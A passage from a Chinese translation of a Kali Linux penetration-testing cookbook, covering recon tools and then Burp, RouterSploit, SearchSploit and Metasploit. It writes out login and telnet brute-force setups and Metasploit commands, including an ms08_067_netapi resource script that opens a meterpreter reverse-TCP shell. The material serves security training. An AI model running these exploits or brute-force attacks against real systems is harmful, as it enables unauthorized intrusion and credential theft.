![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/4eb0f5a2-2bce-45f1-b274-fbd0dac7bc4f.png)

# 空闲扫描

空闲扫描是一种高级技术，其中没有发送到目标的数据包可以追溯到攻击者的机器。它需要指定一个僵尸主机。

# 如何做到...

执行空闲扫描的命令是：

```
nmap -sI zombiehost.com domain.com
```

# 它是如何工作的...

空闲扫描基于可预测的僵尸主机的 IPID 或 IP 分段 ID。首先检查僵尸主机的 IPID，然后欺骗性地从该主机向目标主机发送连接请求。如果端口是打开的，将向僵尸主机发送确认，这将重置连接，因为它没有打开这样的连接的历史记录。接下来，攻击者再次检查僵尸上的 IPID；如果它改变了一步，这意味着从目标接收到了 RST。但如果 IPID 改变了两步，这意味着从目标主机接收到了一个数据包，并且在僵尸主机上有一个 RST，这意味着端口是打开的。

# 搜索打开的目录

在上一篇文章中，我们讨论了如何在网络 IP 或域名上找到开放的端口。我们经常看到开发人员在不同的端口上运行 Web 服务器。有时开发人员也可能会留下错误配置的目录，其中可能包含对我们有用的信息。我们已经在上一章中介绍了 dirsearch；在这里，我们将看看其他选择。

# dirb 工具

`dirb`工具是一个众所周知的工具，可以用来暴力破解打开的目录。虽然它通常速度较慢，不支持多线程，但仍然是发现可能由于错误配置而留下的目录/子目录的好方法。

# 如何做到...

键入以下命令启动工具：

```
    dirb https://domain.com
```

以下屏幕截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/7ccd6dfa-64a0-46df-9fae-d6d362685cba.png)

# 还有更多...

`dirb`中还有其他选项，也很方便：

+   `-a`：指定用户代理

+   `-c`：指定 cookie

+   `-H`：输入自定义标头

+   `-X`：指定文件扩展名

# 另请参阅

+   来自第一章的*Dirsearch*食谱，*Kali-简介*

# 使用 DMitry 进行深度魔法

**Deepmagic 信息收集工具**（**DMitry**）是一个用 C 编写的命令行工具开源应用程序。它具有收集有关目标的子域、电子邮件地址、whois 信息等能力。

# 如何做到...

要了解 DMitry，请按照以下步骤：

1.  我们使用一个简单的命令：

```
        dmitry -h
```

以下屏幕截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/b68c984a-5e1f-442e-bc74-d6c2ed7b9557.png)

1.  接下来，我们尝试执行电子邮件、whois、TCP 端口扫描和子域搜索，使用以下命令：

```
        dmitry -s -e -w -p domain.com
```

以下屏幕截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/1f5adc31-c102-414d-8bdc-06680348ad9d.png)

# 寻找 SSL 漏洞

今天大多数 Web 应用程序都使用 SSL 与服务器通信。`sslscan`是一个很好的工具，用于检查 SSL 是否存在漏洞或配置错误。

# 如何做...

要了解`sslscan`，请按照以下步骤：

1.  我们将查看帮助手册，以了解该工具具有的各种选项：

```
        sslscan -h    
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/9fd70237-5231-4993-b00a-dd03dc3c11f6.png)

1.  要对主机运行该工具，我们输入以下内容：

```
        sslscan host.com:port 
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/6fbdb7d9-86b0-4d42-b21c-208a4571b701.png)

# 另请参阅

+   来自第五章的*一个流血的故事*教程，*当前利用的网络利用*

TLSSLed 也是我们可以在 Kali 中使用的替代工具，用于对 SSL 进行检查。

# 使用 intrace 探索连接

`intrace`工具是一个枚举现有 TCP 连接上的 IP 跳数的好工具。它对于防火墙绕过和收集有关网络的更多信息可能是有用的。

# 如何做...

运行以下命令：

```
    intrace -h hostname.com -p port -s sizeofpacket
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/57200668-142c-4ad4-9ff1-a94c334b426b.png)

# 深入挖掘 theharvester

`theharvester`工具是一个很好的渗透测试工具，因为它可以帮助我们找到有关公司的大量信息。它可以用于查找电子邮件帐户、子域等。在这个教程中，我们将学习如何使用它来发现数据。

# 如何做...

命令非常简单：

```
    theharvester -d domain/name -l 20 -b all    
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/1ac2e24e-7172-47b0-a166-d86a9488910d.png)

# 它是如何工作的...

在前面的教程中，`-d`是域名或我们想要搜索的关键字，`-l`是限制搜索结果的数量，`-b`是我们希望工具在收集信息时使用的来源。该工具支持 Google、Google CSE、Bing、Bing API、PGP、LinkedIn、Google Profiles、people123、Jigsaw、Twitter 和 Google Plus 来源。

# 查找 Web 应用程序背后的技术

在不知道 Web 应用程序的实际技术的情况下开始对 Web 应用程序进行渗透测试是没有意义的。例如，当技术实际上是 ASP.NET 时，运行 dirsearch 查找扩展名为`.php`的文件将是完全无用的。因此，在这个教程中，我们将学习使用一个简单的工具`whatweb`来了解 Web 应用程序背后的技术。它在 Kali 中默认安装。

它也可以从以下网址手动安装[`github.com/urbanadventurer/WhatWeb`](https://github.com/urbanadventurer/WhatWeb)。

# 如何做...

使用`whatweb`可以这样做：

1.  可以使用以下命令启动该工具：

```
        whatweb  
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/d6b1c83b-831f-4eb9-b7b3-a2cdbaebc2af.png)

1.  域名可以作为参数给出，也可以使用`--input-file`参数输入多个域名：

```
        whatweb hostname.com  
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/18d6e528-5d9b-4915-9e3b-047de25bca62.png)

# 使用 masscan 扫描 IP

`masscan`工具是一个了不起的工具；它是最快的端口扫描工具。当以每秒 1000 万个数据包的速度传输时，它被认为是扫描整个互联网。当我们确切地知道我们在网络中寻找哪些端口时，它是 Nmap 的一个很好的替代品。

它类似于 Nmap，但不支持默认端口扫描，所有端口必须使用`-p`指定。

# 如何做...

`masscan`工具使用简单。我们可以使用以下命令开始对网络的扫描：

```
    masscan 192.168.1.0/24 -p 80,443,23   
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/5d155374-61cb-4994-9e75-a48bab2f4dc7.png)

我们还可以使用`--max-rate`指定数据包速率。默认情况下，速率是每秒 100 个数据包。不建议使用它，因为它会给网络设备带来很大的负载。

# 使用 Kismet 进行侦听

Kismet 是一个二层无线网络探测器。它非常方便，因为在企业环境中进行渗透测试时，我们可能也需要查找无线网络。Kismet 可以嗅探 802.11a/b/g/n 流量。它适用于支持原始监控模式的任何无线网卡。

在这个步骤中，我们将学习如何使用 Kismet 来监视 Wi-Fi 网络。

# 如何做...

要了解 Kismet，请按照以下步骤进行：

1.  我们使用以下命令启动 Kismet：

```
        kismet  
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/5493fe78-c8cd-4789-b7bf-4f6c61853ed1.png)

1.  一旦 GUI 启动，它将要求我们启动服务器，我们选择“是”：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/0b4e0d63-8022-40c1-8f75-9a9a6a10a03e.png)

1.  接下来，我们需要指定一个源接口，在我们的情况下是`wlan0`，所以我们输入那个。确保在 Kismet 中初始化之前，接口处于监视模式：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/a33dde97-bad0-4394-80be-7dea40cd82cc.png)

1.  现在我们将看到我们周围所有无线网络的列表：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/4a7ae25d-38de-4399-a0cb-2ef87a6c7f6e.png)

1.  默认情况下，Kismet 会监听所有频道，因此我们可以通过从 Kismet 菜单中选择“配置频道...”来指定特定频道：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/27cf346f-24c0-4708-bdb5-b377881b88b6.png)

1.  我们可以在这里选择频道号：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/329dd92b-610f-4050-860a-647c9c7c7cfc.png)

1.  Kismet 还允许我们查看信噪比。我们可以通过在 Windows 菜单中选择“通道详情...”来查看：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/8df58adf-44cd-4d50-946c-3da348446927.png)

1.  在无线侦察时，这种信噪比非常有用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/3d9a1ef3-a427-4159-9d88-0465df617b8d.png)

# 使用 firewalk 测试路由器

`firewalk`工具是一个网络安全侦察工具，可以帮助我们弄清楚我们的路由器是否真的在做它们应该做的工作。它尝试找出路由器/防火墙允许什么协议，以及它将阻止什么。

这个工具在渗透测试中非常有用，可以验证企业环境中的防火墙策略。

# 如何做...

以下是使用`firewalk`的步骤：

1.  如果找不到`firewalk`，我们可以使用以下命令进行安装：

```
        apt install firewalk
```

1.  我们可以使用以下命令运行 firewalk：

```
        firewalk -S1-23 -i eth0 192.168.1.1 192.168.10.1   
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/35de97da-2b06-47dc-9934-cd6ac24ea7b1.png)

# 工作原理...

在上述命令中，`-i`用于指定网络接口，`-S`用于指定我们要测试的端口号，接下来的两个是路由器的 IP 地址和我们要检查与我们的路由器相对的主机的 IP 地址。

Nmap 还包括一个执行 firewalk 的脚本。更多信息可以在[`nmap.org/nsedoc/`](https://nmap.org/nsedoc/)找到。


# 第三章：漏洞评估

在本章中，我们将介绍以下食谱：

+   使用臭名昭著的 Burp

+   使用 Wsdler 利用 WSDL

+   使用入侵者

+   使用 Vega 进行 Web 应用程序渗透测试

+   探索 SearchSploit

+   使用 RouterSploit 利用路由器

+   使用 Metasploit

+   自动化 Metasploit

+   编写自定义资源脚本

+   Metasploit 中的数据库

# 介绍

在之前的章节中，我们介绍了收集有关目标信息的各种方法。现在，一旦我们拥有了所有这些数据，我们就需要开始寻找漏洞。要成为一名优秀的渗透测试人员，我们需要确保没有忽视任何细节。

# 使用臭名昭著的 Burp

Burp 已经存在多年了；它是由 PortSwigger web security 用 Java 构建的多个工具的集合。它有各种产品，如解码器、代理、扫描器、入侵者、重复者等等。Burp 具有一个扩展程序，允许用户加载不同的扩展，可以用来使渗透测试更加高效！您将在即将到来的食谱中了解其中一些。

# 如何做...

让我们看看如何有效地使用 Burp：

1.  Kali 已经有一个免费版本的 Burp，但我们需要一个完整版本才能充分利用其功能。所以，我们打开 Burp：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/6bf67c4c-eb69-4f39-8bc5-333e104d5d5f.png)

1.  点击开始 Burp，我们将看到 Burp 加载：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/881391ce-4318-44cc-b771-bb20cb3a3b99.png)

1.  在我们开始寻找错误之前，我们首先安装一些可能会派上用场的扩展。从 Extender 菜单中选择 BApp Store：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/56de3da9-f7fd-426b-b191-3188d1cc0b62.png)

1.  我们将看到一个扩展列表。我们将不得不安装一些扩展，如下所示：

+   J2EEScan

+   Wsdler

+   Java 反序列化扫描器

+   HeartBleed

1.  选择每个扩展后，点击安装。

1.  一旦扩展都设置好了，我们就准备开始扫描。我们启动浏览器并进入其偏好设置：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/f088c533-6da8-4c7b-979f-28ad3e567ed3.png)

1.  在网络设置中，我们添加我们的 HTTP 代理 IP 和端口：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/ad3ce255-442e-41c4-ac44-daee68e5ac46.png)

1.  我们可以在 Burp 的选项选项卡下的代理菜单下验证这一点：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/0eadca98-90a7-4d1b-80e1-4a330497aad0.png)

1.  点击拦截开启请求拦截：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/908cb3b6-f9b7-48d6-9dc6-c035a410a276.png)

1.  现在我们浏览我们需要扫描的网站。

1.  一旦所有请求都被捕获，我们可以简单地转到目标并选择我们的域。

1.  要执行扫描，我们可以选择单个请求并将其发送进行主动扫描：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/4f18b48c-ab13-4ad2-924d-fd4a832c2a57.png)

1.  或者，我们可以选择整个域发送进行主动扫描：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/7b894203-9fc2-4916-a035-0b43f5533e88.png)

1.  一旦我们将请求发送到扫描器，我们将转到扫描器选项卡并选择选项。在这里，我们可以告诉扫描器我们希望在我们的应用程序中查找什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/0c0c7984-3605-491a-99ad-2ef2e5461d70.png)

1.  我们可以在扫描队列选项卡中看到我们的扫描结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/3b2e1bd4-a5ca-466a-8641-92abb9e7983f.png)

1.  扫描队列选项卡可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/ea2ad651-5969-474e-b98e-b247da52af27.png)

以下截图显示了更详细的扫描队列选项卡的结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/a8c06bbe-5d51-40a3-b5f9-2f9bc4cff143.png)

虽然我们这里只使用了几个扩展，但你也可以查看整个列表并选择你自己的扩展。扩展很容易设置。

# 使用 Wsdler 利用 WSDL

**Web 服务描述语言**（**WSDL**）是一种基于 XML 的语言，用于描述 Web 服务提供的功能。在执行渗透测试项目时，我们经常会发现一个 WSDL 文件是公开的，没有经过身份验证。在这个食谱中，我们将看看我们如何从 WSDL 中受益。

# 如何做...

我们拦截 Burp 中的 WSDL 请求：

1.  右键单击请求并选择解析 WSDL：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/7d94e544-5fd8-4c3b-b84f-d65e4537647b.png)

1.  切换到 Wsdler 选项卡，我们将看到所有的服务调用。我们可以通过点击其中任何一个来查看完整的请求：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/4f434c5f-9019-454b-afe9-9e6ed8e47d78.png)

1.  为了能够进行调试，我们需要将其发送到 Repeater：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/2dc82b0f-2bd7-452e-b24f-fd1f8d47d489.png)

1.  右键单击并选择“发送到 Repeater”：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/de63411d-954c-4652-a657-0f657911650f.png)

1.  在我们的情况下，我们可以看到输入单引号会引发错误。哇！我们有了一个 SQL 注入的可能性！

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/b106fb9d-d181-431a-b43a-41bad8c5c726.png)

以下截图显示了 SQL 注入：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/4b62972b-ff6e-47b5-9118-94cbae4919d7.png)

您将在本书的后面章节中了解更多关于利用 SQL 的内容。

# 使用入侵者

入侵者是一个很棒的工具，可以让我们执行不同类型的攻击，用来发现各种漏洞。入侵者可以执行的一些最常见的攻击如下：

+   暴力破解

+   模糊

+   枚举

+   应用层 DoS

# 如何做…

我们首先从捕获的请求中获取一个请求：

1.  右键单击请求并选择“发送到 Intruder”：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/5408a3db-b6f0-42ab-a8fd-419cd4a25254.png)

1.  切换到 Intruder 选项卡。我们需要指定有效载荷位置，可以通过选择我们想要的位置或选择有效载荷，然后单击“添加§”按钮来完成：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/a5dd2684-8d7a-4065-8c23-9119be59390d.png)

1.  在我们的情况下，由于我们正在执行登录暴力破解，我们将使用攻击类型 Pitchfork：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/3085617a-88a0-46ee-9733-a433c0a6f8c3.png)

1.  接下来，我们切换到有效载荷选项卡。这是我们将输入有效载荷的地方：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/28531766-4ed7-4078-b317-c4a345c5d6dc.png)

1.  我们选择 set 1，并且由于我们正在进行暴力破解，我们可以选择一个简单的列表作为有效载荷类型。

1.  在有效载荷选项中，我们指定要对应用程序进行测试的单词列表。我们可以手动输入它们，也可以选择预先构建的列表：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/924c877b-729e-46d0-8292-c6b5a6d608c0.png)

1.  现在我们选择 set 2，并再次指定我们希望工具尝试的密码列表：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/c0a732d6-084b-4b88-85f3-203de8f3e2bb.png)

1.  Burp 允许我们通过配置选项来自定义攻击，例如线程数量、选择重定向选项，甚至在选项标签中进行 Grep - 匹配：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/b2c713a0-b51e-4bbb-928c-8a7ac0832f43.png)

1.  我们点击“开始攻击”：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/ac6e145b-78c9-474a-8eca-b7f95fa3352a.png)

1.  一个新窗口将弹出，显示执行的攻击的所有结果。

在这里，我们只使用了一种攻击模式（Pitchfork）。可以在[`nitstorm.github.io/blog/burp-suite-intruder-attack-types/`](https://nitstorm.github.io/blog/burp-suite-intruder-attack-types/)了解有关入侵者不同攻击模式的更多信息。

# 使用 Vega 进行 Web 应用程序渗透测试

Vega 是一个内置的 Java Web 应用程序渗透测试工具。它具有基于 JavaScript 的 API，使其更加强大和灵活。Vega 在以下配方中非常容易使用，您将学习如何使用它执行扫描。

# 准备工作

一些 Kali 版本没有安装 Vega，但可以使用以下命令进行安装：

```
apt-get install vega  
```

# 如何做…

1.  Vega 内置在 Kali 中，可以使用以下命令启动：

```
 vega 
```

上述命令打开了 Vega 工具：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/dd0ff0c4-1db1-4e5c-adf6-c57ca45dbf31.png)

1.  在 Vega 中有两种启动扫描的方式——选择扫描器模式或代理模式。我们在这里看看扫描器模式。

1.  我们从扫描菜单中选择“开始新扫描”选项：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/3efd37ca-7e6e-469a-b239-55630cc190f7.png)

1.  在窗口中，我们输入网站的 URL 并点击“下一步”：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/ebd88c24-7d30-4b3a-969f-552b98a805ea.png)

1.  然后，我们可以选择要运行的模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/f9230493-ffa3-45f8-a5de-a2df2afbc070.png)

1.  在这一步中，我们可以输入 cookies：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/a47506c5-a4ab-44cc-bfca-9616bcf37933.png)

1.  接下来，我们指定是否要排除任何参数，然后点击“完成”：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/c61afa2f-d25d-4de9-8008-50a7ebd4466f.png)

1.  我们可以在左侧窗格中看到结果和漏洞：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/5c6ae148-0784-4aa1-801e-1c2dcad3eec1.png)

1.  点击警报会显示详细信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/19eb884e-162a-4216-bded-2ba3962e2b34.png)

1.  与 Burp 类似，Vega 也具有代理功能，我们可以手动拦截和分析请求！

1.  我们可以编辑和重放请求以执行手动检查：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/315fef04-154f-49c8-b465-d349170c1841.png)

# 探索 SearchSploit

SearchSploit 是一个命令行工具，允许我们搜索和浏览`exploitdb`中所有可用的漏洞利用。

# 如何做...

1.  要查看帮助，我们输入以下命令：

```
    searchsploit -h
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/ca6b78a7-aa82-4b0d-bc64-d2c659baa498.png)

1.  我们可以通过简单输入关键字来进行搜索，如果想将漏洞利用复制到我们的工作目录中，我们使用这个：

```
     searchsploit -m exploitdb-id
```

以下截图是前面命令的示例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/aae516a3-7de5-42b4-ad58-64f0f165e9c2.png)

# 使用 RouterSploit 来利用路由器

RouterSploit 是专为嵌入式设备设计的路由器利用框架。它由三个主要模块组成：

+   `exploits`：这包含了所有公开可用的漏洞利用列表

+   `creds`：这用于测试不同设备的登录

+   `scanners`：这用于检查特定设备的特定漏洞利用

# 准备工作

在开始之前，我们将不得不在 Kali 中安装 RouterSploit；不幸的是，它不随操作系统的官方安装而来。RouterSploit 的安装非常简单，就像我们在书的开头安装一些工具一样。

# 如何做...

1.  我们使用以下命令克隆 GitHub 存储库：

```
      git clone https://github.com/reverse-shell/routersploit
```

1.  我们使用`cd routersploit`命令进入目录，并按以下方式运行文件：

```
      ./rsf.py  
```

以下截图显示了*步骤 1*的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/3f7fefa3-8c45-4573-b70d-c251b6cca0ee.png)

1.  要对路由器运行漏洞利用，我们只需输入：

```
      use exploits/routername/exploitname
```

以下截图显示了前面命令的示例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/dc034ba9-22c5-46ff-811d-e8f167bd9838.png)

1.  现在我们看到了我们选择的漏洞利用的可用选项。我们使用以下命令：

```
      show options
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/ac6a4589-24be-407d-a1fb-a66a15d7f9e1.png)

1.  我们使用以下命令设置目标：

```
      set target 192.168.1.1
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/79807c37-6bc6-45a9-9f7f-e88b5b280159.png)

1.  要进行利用，我们只需输入`exploit`或`run`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/4b14af80-182d-4e6c-b576-77cda8d9544b.png)

# 使用`scanners`命令

以下步骤演示了`scanners`的使用：

1.  要扫描 Cisco 路由器，我们使用以下命令：

```
 use scanners/cisco_scan
```

1.  现在我们检查其他选项：

```
 show options
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/d3d83d46-d35b-4783-a65b-68a4cffd3872.png)

1.  要对目标运行扫描，我们首先设置目标：

```
 set target x.x.x.x
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/a4e40abe-76c7-4260-b735-d6ddf5212e13.png)

1.  现在我们运行它，它会显示路由器易受攻击的所有漏洞：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/7e46083b-be3e-4932-be13-71b3a3f05aa6.png)

# 使用凭证

这可以用来测试服务上的默认密码组合，通过字典攻击：

1.  我们使用`creds`命令对各种服务运行字典攻击：

```
      use creds/telnet_bruteforce 
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/fe7dc234-f3e6-42b5-afea-4cfb6953c4fb.png)

1.  接下来，我们看看选项：

```
      show options
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/5cfd579c-e373-44be-a295-bbc829969bda.png)

1.  现在我们设置目标 IP：

```
      set target x.x.x.x
```

1.  我们让它运行，它会显示任何找到的登录。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/88cc6d26-eb66-4748-a271-2e05757c2ed3.png)

# 使用 Metasploit

Metasploit 是最广泛使用的开源渗透测试工具。它最初是由 HD Moore 在 2001 年用 Perl 开发的；后来，它完全重写为 Ruby，然后被 Rapid7 收购。

Metasploit 包含一系列利用、有效载荷和编码器，可用于在渗透测试项目中识别和利用漏洞。在本章中，我们将介绍一些能够更有效地使用**Metasploit Framework**（**MSF**）的示例。

# 如何做…

以下步骤演示了 MSF 的使用：

1.  通过输入以下命令启动 MSF：

```
        msfconsole
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/5f9ac818-4f38-4c8d-b717-084f59b1e80e.png)

1.  要搜索漏洞，我们输入：

```
        search exploit_name
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/f4b5869b-e3cb-40ff-bf45-f6c6b6def95e.png)

1.  要使用漏洞利用，我们输入：

```
        use exploits/path/to/exploit  
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/a470cc8f-a78a-45b8-a55c-673832a22eef.png)

1.  接下来，我们通过输入以下内容来查看选项：

```
        show options  
```

1.  在这里，我们需要设置有效载荷、目标 IP、本地主机和我们想要的后向连接端口。

1.  我们使用以下命令设置目标：

```
        set RHOST x.x.x.x  
```

1.  我们使用以下命令设置有效载荷：

```
 set payload windows/meterpreter/reverse_tcp  
```

1.  接下来，我们设置我们想要连接的`lhost`和`lport`：

```
 set lhost x.x.x.x
 set lport 4444
```

1.  现在我们运行利用命令：

```
        exploit  
```

1.  成功利用后，我们将查看`meterpreter`会话：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/1d04530a-772f-4990-b211-bfaf55a3e5d7.png)

尽管我们这里只使用了 Windows 的`reverse_tcp`，但 Metasploit 还有很多其他有效载荷，取决于后端操作系统或使用的 Web 应用程序。可以在[`www.offensive-security.com/metasploit-unleashed/msfpayload/`](https://www.offensive-security.com/metasploit-unleashed/msfpayload/)找到有效载荷的完整列表。

# 自动化 Metasploit

Metasploit 支持不同方式的自动化。我们将在这里介绍一种方式，即资源脚本。

**资源脚本**基本上是一组在加载脚本时自动运行的命令。Metasploit 已经包含了一组预先构建的脚本，在企业渗透测试环境中非常有用。可在`/usr/share/metasploit-framework/scripts/resource`目录中看到可用脚本的完整列表：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/e679e4ce-09df-4c2e-9d1f-8b10715d156f.png)

# 如何做…

以下步骤演示了 Metasploit 的自动化：

1.  我们使用以下命令启动 Metasploit：

```
        msfconsole 
```

前面命令的输出如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/7a93f94e-349d-4db7-8a4e-c8c15d21aa23.png)

1.  一些脚本需要全局设置`RHOSTS`，因此我们使用以下命令设置`RHOSTS`：

```
        set RHOSTS 172.18.0.0/24 
```

前面命令的输出如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/fb6463b9-936d-429a-8bad-06e8dbb4f965.png)

1.  现在我们使用以下命令运行脚本：

```
        resource /usr/share/metasploit-framework
        /scripts/resource/basic_discovery.rc
```

1.  此脚本将在提供的子网上进行基本主机发现扫描：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/c1249d0f-a3d2-474f-bf38-51672ab1938a.png)

# 编写自定义资源脚本

在下一个示例中，我们将看看如何编写一个基本脚本。

# 如何做…

按照以下步骤编写基本脚本：

1.  我们打开任何编辑器—`nano`，`leafpad`等等。

1.  在这里，我们输入所有我们希望 MSF 执行的命令：

```
     use exploit/windows/smb/ms08_067_netapi
     set payload windows/meterpreter/reverse_tcp
     set RHOST 192.168.15.15
     set LHOST 192.168.15.20
     set LPORT 4444
     exploit -j
```

1.  我们将脚本保存为`.rc`扩展名：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/e727ff55-006e-444e-b02a-0593fef1e1d6.png)

1.  现在我们启动`msfconsole`并输入命令自动利用机器：

